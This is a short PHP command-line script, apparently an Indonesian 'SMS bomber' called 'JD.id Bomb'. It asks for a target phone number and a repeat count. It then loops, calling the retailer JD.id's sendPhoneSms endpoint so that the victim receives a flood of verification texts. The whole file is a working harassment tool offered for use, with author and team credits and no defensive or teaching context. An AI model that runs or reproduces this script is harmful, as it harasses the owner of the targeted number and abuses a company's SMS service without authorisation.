<?php
/*Coded By ./CE.19*/
/*CopyRight 2k18 Fajar Iwan*/
/*Don't Remove CopyRight*/
function crazyerror($cr, $azy){
$ce = 0;
while($ce < $azy) {
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"https://sc.jd.id/phone/sendPhoneSms");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=".$cr."&smsType=1");
$server_output = curl_exec ($ch);
curl_close ($ch);
echo $server_output."\n";
$ce++;
flush();
}
}
system('clear');
echo "\n";
sleep(1);
echo "\e[91mAuthor\e[92m [#] \e[93mFajar Iwan\n";
sleep(1);
echo "\e[91mNick\e[92m   [#] \e[93m./CE.19\n";
sleep(1);
echo "\e[91mTeam\e[92m   [#] \e[93mGaruda Tersakti 72\n";
sleep(1);
echo "\e[91mName\e[92m   [#] \e[93mJD.id Bomb\n";
sleep(1);
echo "\e[91mContoh\e[92m [#] \e[93m8xxxxxxxxxxx\n";
sleep(1);
echo "\n";
echo "[#] \e[92mTARGET : \e[93m ";
$error = trim(fgets(STDIN));
echo "[#] \e[92mJUMLAH : \e[93m ";
$crazy = trim(fgets(STDIN));
echo "\e[93m"; 
$execute = crazyerror($error, $crazy);
print $execute;
?>
